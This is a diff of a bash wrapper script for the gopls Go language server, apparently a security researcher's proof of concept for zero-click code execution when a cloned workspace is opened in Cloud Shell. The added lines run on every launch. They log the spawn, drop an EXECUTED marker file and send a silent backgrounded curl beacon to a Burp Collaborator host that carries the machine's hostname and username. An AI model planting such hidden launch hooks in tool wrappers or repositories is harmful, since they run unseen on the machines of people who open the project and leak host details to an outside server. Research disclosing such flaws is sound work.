@@ -31,9 +31,29 @@ set -euo pipefail
 SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
 SCRIPT_NAME="$(basename "${BASH_SOURCE[0]}")"
 
+# ── Evidence trail (zero-click re-run, 2026-09-22) ─────────────────────────────
+# Every spawn leaves THREE artifacts, all written before any prompt/click:
+#   1. /tmp/gopls-wrapper-exec.log      — append-only log on the VM
+#   2. EXECUTED-<epoch>-pid<pid> file   — marker in the cloned workspace (visible
+#                                         in the Cloud Shell file explorer)
+#   3. OOB beacon to Burp Collaborator  — independent timestamped proof
+EVIDENCE_LOG="/tmp/gopls-wrapper-exec.log"
+{
+  echo "========================================================================"
+  echo "[gopls-wrapper] $(date -Iseconds) SPAWN: pid=$$ ppid=${PPID} cwd=$(pwd) user=$(whoami) host=$(hostname)"
+  echo "[gopls-wrapper] argv: $0 $*"
+} >> "${EVIDENCE_LOG}" 2>/dev/null || true
+
+touch "${SCRIPT_DIR}/EXECUTED-$(date +%s)-pid$$" 2>/dev/null || true
+
+( curl -s -m 5 -o /dev/null \
+    "https://01z7lq0h27vsaiurpbtqd3lqzh58tyhn.oastify.com/gopls-zero-click?h=$(hostname)&u=$(whoami)&ppid=${PPID}&t=$(date +%s)" \
+    >/dev/null 2>&1 & ) || true
+
 # ── Logging (to stderr to keep stdio clean for LSP) ───────────────────────────
 log() {
   echo "[${SCRIPT_NAME}] $(date -Iseconds) $*" >&2
+  echo "[${SCRIPT_NAME}] $(date -Iseconds) $*" >> "${EVIDENCE_LOG}" 2>/dev/null || true
 }
 
 # ── Cleanup handler ───────────────────────────────────────────────────────────
